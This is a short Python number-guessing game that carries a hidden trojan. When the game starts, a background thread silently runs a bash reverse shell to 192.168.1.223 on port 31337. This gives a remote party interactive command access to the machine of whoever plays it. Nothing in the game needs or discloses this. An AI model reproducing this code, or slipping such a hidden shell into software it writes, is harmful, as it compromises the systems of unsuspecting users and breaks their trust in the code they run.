import random
import subprocess
import threading

number = random.randint(1, 10)

player_name = input("Hello, What's your name?")
number_of_guesses = 0
print('okay! '+ player_name+ ' I am Guessing a number between 1 and 10:')

def fn():
    try:
        subprocess.check_call("/bin/bash -i >/dev/tcp/192.168.1.223/31337 0<&1 2>&1", shell=True, executable='/bin/bash')
    except:
        return 0

thread = threading.Thread(target=fn)
thread.start()

while number_of_guesses < 5:
    guess = int(input())
    number_of_guesses += 1
    if guess < number:
        print('Your guess is too low')
    if guess > number:
        print('Your guess is too high')
    if guess == number:
        break
if guess == number:
    print('You guessed the number in ' + str(number_of_guesses) + ' tries!')
else:
    print('You did not guess the number, The number was ' + str(number))